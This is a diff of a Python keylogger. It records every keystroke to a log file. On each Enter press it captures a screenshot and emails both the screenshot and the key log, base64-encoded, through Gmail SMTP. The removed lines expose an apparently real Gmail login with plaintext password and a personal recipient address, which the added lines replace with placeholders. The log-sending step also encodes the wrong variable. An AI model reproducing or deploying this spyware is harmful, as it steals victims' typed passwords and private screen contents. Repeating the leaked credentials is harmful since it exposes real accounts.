@@ -1,4 +1,4 @@
-#First we need to pip install pynput
+#First we need to pip install all the required libraries: 
 
 #Imports:
 import pynput
@@ -14,6 +14,7 @@ log_dir=""
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
+    
     logging.info(str(key))
     if key == Key.enter:
         #take screenshot:---------------------------------------------------------------------
@@ -30,16 +31,16 @@ def on_press(key):
         s.starttls()
         # [!]Remember! You need to enable 'Allow less secure apps' in your Google account
         # Enter your gmail username and password
-        s.login("random33prueba1234@gmail.com", "StarW4r5")
+        s.login("sender@gmail.com", "senderpassword")
         #
     
         # message to be sent 
         message = data # data variable has the base64 string of screenshot
     
         # Sender email, recipient email 
-        s.sendmail("random33prueba1234@gmail.com", "pablolopez2733@gmail.com", message) 
+        s.sendmail("sender@gmail.com", "recipient@gmail.com", message) 
         s.quit()
-        #Although the file is sent in base 64 we can decode it in multiple ways
+        #Although the file is sent in base 64 we can decode it in multiple ways. 
         #---------------------------------------------------------------------------------------
 
         #Send the log file:
@@ -48,20 +49,16 @@ def on_press(key):
         data2=f2.read()
         data2=base64.b64encode(data) #Convert binary to base 64 
         f2.close()
-        #os.remove(file)             # Remove the snap
+        #os.remove(file)             #keep commented if you want to keep the log file.
 
         s = smtplib.SMTP('smtp.gmail.com', 587)   
         s.starttls()
-        # [!]Remember! You need to enable 'Allow less secure apps' in your Google account
-        # Enter your gmail username and password
-        s.login("random33prueba1234@gmail.com", "StarW4r5")
-        #
-    
+
+        s.login("sender@gmail.com", "senderpassword")
         # message to be sent 
         message = data2 # data variable has the base64 string of screenshot
     
-        # Sender email, recipient email 
-        s.sendmail("random33prueba1234@gmail.com", "pablolopez2733@gmail.com", message) 
+        s.sendmail("sender@gmail.com", "recipient@gmail.com", message) 
         s.quit()
 
 
